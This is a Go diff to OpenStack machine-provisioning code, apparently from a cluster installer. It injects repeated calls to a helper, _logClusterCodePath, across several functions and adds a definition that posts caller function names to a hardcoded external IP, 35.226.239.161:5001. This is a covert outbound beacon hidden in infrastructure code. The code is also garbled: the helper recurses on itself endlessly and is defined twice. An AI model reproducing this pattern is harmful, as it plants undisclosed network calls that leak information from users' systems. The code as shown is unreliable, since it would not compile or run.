@@ -26,6 +26,8 @@ func Machines(clusterID string, config *types.InstallConfig, pool *types.Machine
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if configPlatform := config.Platform.Name(); configPlatform != openstack.Name {
 		return nil, fmt.Errorf("non-OpenStack configuration: %q", configPlatform)
 	}
@@ -56,9 +58,13 @@ func provider(clusterID string, platform *openstack.Platform, mpool *openstack.M
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &openstackprovider.OpenstackProviderSpec{TypeMeta: metav1.TypeMeta{APIVersion: "openstackproviderconfig.k8s.io/v1alpha1", Kind: "OpenstackProviderSpec"}, Flavor: mpool.FlavorName, Image: osImage, CloudName: CloudName, CloudsSecret: &corev1.SecretReference{Name: cloudsSecret, Namespace: cloudsSecretNamespace}, UserDataSecret: &corev1.SecretReference{Name: userDataSecret}, Networks: []openstackprovider.NetworkParam{{Subnets: []openstackprovider.SubnetParam{{Filter: openstackprovider.SubnetFilter{Name: fmt.Sprintf("%s-nodes", clusterID), Tags: fmt.Sprintf("%s=%s", "openshiftClusterID", clusterID)}}}}}, AvailabilityZone: az, SecurityGroups: []openstackprovider.SecurityGroupParam{{Name: fmt.Sprintf("%s-%s", clusterID, role)}}, Trunk: trunkSupportBoolean(trunk), Tags: []string{fmt.Sprintf("openshiftClusterID=%s", clusterID)}, ServerMetadata: map[string]string{"Name": fmt.Sprintf("%s-%s", clusterID, role), "openshiftClusterID": clusterID}}, nil
 }
 func trunkSupportBoolean(trunkSupport string) (result bool) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -75,6 +81,19 @@ func ConfigMasters(machines []machineapi.Machine, clusterID string) {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
 func _logClusterCodePath() {
 	_logClusterCodePath()
@@ -90,5 +109,5 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
